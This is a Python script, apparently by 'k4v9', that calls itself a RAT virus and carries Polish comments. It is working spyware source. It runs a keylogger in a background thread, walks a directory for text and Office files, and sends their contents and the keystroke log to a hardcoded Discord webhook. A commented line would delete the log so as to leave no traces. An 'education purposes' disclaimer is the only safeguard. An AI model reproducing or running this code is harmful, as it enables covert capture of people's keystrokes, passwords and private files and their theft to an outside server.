# ===================================================
# RAT VIRUS BY k4v9
# ===================================================

import os
import requests
import time
from datetime import datetime
from pynput import keyboard  # Wymaga: pip install pynput
import threading

# --- KONFIGURACJA (TO JEDYNE MIEJSCE, KTORE k4v9 EDYTUJE) ---
# PROSZĘ WKLEIĆ SWÓJ SKOPIOWANY URL WEBHOOKA POMIĘDZY CUDZYSŁOWAMI
WEBHOOK_URL = "https://discord.com/api/webhooks/1508093660598636565/vteo07lEk6cL09f7-_EjOxl33JLlepl4BDFVVN35MKB3hEvWsv4_Rqm0dOCSDfDPbuIJ"

# Katalog, w którym program będzie szukał plików demonstracyjnych
DOCELOWY_KATALOG = r"C:\Desktop"

# Lista rozszerzeń plików, które będą "zbierane" (tylko dla przykładu)
ROZSZERZENIA = [".txt", ".docx", ".xlsx"]

# ---------------------------------------------------

# Tworzenie katalogu demonstracyjnego, jeśli nie istnieje
os.makedirs(DOCELOWY_KATALOG, exist_ok=True)

def wyslij_do_discorda(wiadomosc):
    """Wysyła wiadomość tekstową na Discorda przez webhook."""
    try:
        # Wysłanie zapytania POST z wiadomością do webhooka
        requests.post(WEBHOOK_URL, json={"content": wiadomosc}, timeout=2)
    except Exception as e:
        # W razie błędu (np. brak internetu) po prostu ignorujemy, by program nie przerwał działania
        print(f"Nie udało się wysłać wiadomości: {e}")

def loguj_klawisz(klawisz):
    """Funkcja wywoływana za każdym razem, gdy użytkownik naciśnie klawisz."""
    try:
        # Zapisujemy naciśnięty klawisz do pliku w katalogu DOCELOWY_KATALOG
        with open(os.path.join(DOCELOWY_KATALOG, "log_klawiszy.txt"), "a", encoding="utf-8") as f:
            # Zapisujemy znacznik czasu i wciśnięty klawisz
            f.write(f"{datetime.now()}: {klawisz}\n")
    except:
        pass

def nasluch_klawiszy():
    """Uruchamia nasłuchiwanie klawiatury w osobnym wątku."""
    with keyboard.Listener(on_press=loguj_klawisz) as listener:
        listener.join()

def zbierz_i_wyslij_pliki():
    """Przeszukuje DOCELOWY_KATALOG i wysyła pliki pasujące do ROZSZERZENIA."""
    wyslij_do_discorda(f"**Rozpoczęcie zbierania plików z katalogu:** {DOCELOWY_KATALOG}")
    for root, dirs, files in os.walk(DOCELOWY_KATALOG):
        for plik in files:
            if any(plik.lower().endswith(ext) for ext in ROZSZERZENIA):
                pelna_sciezka = os.path.join(root, plik)
                try:
                    with open(pelna_sciezka, "r", encoding="utf-8") as f:
                        zawartosc = f.read()
                    # Wysyłamy pierwsze 500 znaków pliku, aby nie przekroczyć limitu Discorda
                    wyslij_do_discorda(f"**Plik:** {plik}\n```{zawartosc[:500]}...```")
                except Exception as e:
                    wyslij_do_discorda(f"Błąd odczytu pliku {plik}: {e}")
                time.sleep(1)  # Małe opóźnienie, aby nie wysłać wszystkiego na raz

def wyslij_log_klawiszy():
    """Wysyła zawartość pliku z logami klawiszy."""
    log_path = os.path.join(DOCELOWY_KATALOG, "log_klawiszy.txt")
    if os.path.exists(log_path):
        with open(log_path, "r", encoding="utf-8") as f:
            tresc = f.read()[-2000:]  # Wysyłamy tylko ostatnie 2000 znaków
        wyslij_do_discorda(f"**Log klawiszy (ostatnie 2000 znaków):**\n```{tresc}```")
        # Po wysłaniu możemy usunąć plik z logami, by nie zostawić śladów
        # os.remove(log_path)

# ----------------- GŁÓWNA CZĘŚĆ PROGRAMU -----------------
if __name__ == "__main__":
    print("="*50)
    print("RAT BY K4V9")
    print("="*50)
    print(f"Use Only For Education Purposes.")
    print(f"This Is Also Keylogger Who are sending all information from:\n {DOCELOWY_KATALOG}")
    print("Aby rozpocząć demonstrację, utwórz kilka przykładowych plików w tym katalogu.")
    input("\nClick Enter, for start a keylogger...")

    # Uruchomienie nasłuchu klawiszy w tle
    thread_klawisze = threading.Thread(target=nasluch_klawiszy, daemon=True)
    thread_klawisze.start()
    print("Keylogger is ACTIVE. Program will recording keyboard for 60 seconds...")

    # Nasłuchiwanie przez 60 sekund
    time.sleep(60)

    print("Stopping Keylogger and start collecting files...")
    # Zatrzymanie nasłuchu (w tym uproszczonym przykładzie po prostu kończymy wątek)
    # W rzeczywistości wymagałoby to bardziej zaawansowanej obsługi, ale dla demonstracji wystarczy.

    # Zbieranie i wysyłanie plików
    zbierz_i_wyslij_pliki()
    # Wysyłanie logów klawiszy
    wyslij_log_klawiszy()
    wyslij_do_discorda("**DEMONSTRACJA ZAKOŃCZONA** – this message is a confirmation that the program is working correctly.")
    print("Gotowe. Ready, Check Your Discord Channel :).")